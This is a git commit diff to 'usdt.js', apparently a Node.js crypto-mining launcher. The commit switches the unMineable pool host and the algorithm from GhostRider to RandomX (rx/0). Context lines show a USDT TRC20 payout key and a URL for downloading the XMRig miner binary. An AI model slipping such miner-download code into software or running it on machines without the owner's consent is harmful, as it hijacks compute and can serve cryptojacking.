2e57c3734e16816c0a5a63c291d5569b32b3b4f7
isalbytex <isalbyte@proton.me>
2026-07-13 21:35:44 -0700

    Update usdt.js

--- usdt.js
+++ usdt.js
@@ -4,10 +4,10 @@ const https = require('https');
 
 // === CONFIG ===
 // USDT payout memakai alamat TRON/TRC20.
-const ADDR = 'ghostrider.unmineable.com:3333';
+const ADDR = 'rx-us.unmineable.com:3333';
 const AUTH_KEY = 'USDT:TJm8qGE5gmMVcfwFTmWBqwrjSkDFnhs81x#c5kh-a9zb';
 const PASS = 'x';
-const MODE = 'ghostrider';
+const MODE = 'rx/0';
 
 const XMRIG_VERSION = '6.26.0';
 const REMOTE_URL = `https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz`;
